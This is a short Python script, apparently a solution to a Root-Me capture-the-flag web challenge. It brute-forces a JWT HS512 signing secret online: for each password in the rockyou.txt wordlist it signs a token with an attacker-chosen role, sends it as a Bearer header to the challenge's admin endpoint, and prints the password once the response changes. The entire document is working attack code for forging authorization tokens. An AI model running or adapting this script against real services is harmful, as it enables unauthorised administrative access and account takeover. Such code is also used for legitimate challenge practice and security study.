import jwt
import requests
import sys
import time 

payload = {"role" : sys.argv[1]}
print("Payload is : " , payload)
time.sleep(2)
print("Let's try.")
r = requests.Session()


def find_jwt_pass() :
    with open("rockyou.txt","r") as f : 
        for line in f: 
            pass_test = line.strip("\n")
            jwt_token = jwt.encode(payload,pass_test,algorithm="HS512")
            jwt_str = jwt_token.decode("utf-8")
            print("Testing :", jwt_str)
            r.headers = {'Authorization': 'Bearer '+jwt_str}
            response = r.post("http://challenge01.root-me.org/web-serveur/ch59/admin")
            if("I was right" not in response.text) : 
                print(response.text)
                print("Password was : ", pass_test)
                return 0
    return 1

find_jwt_pass()
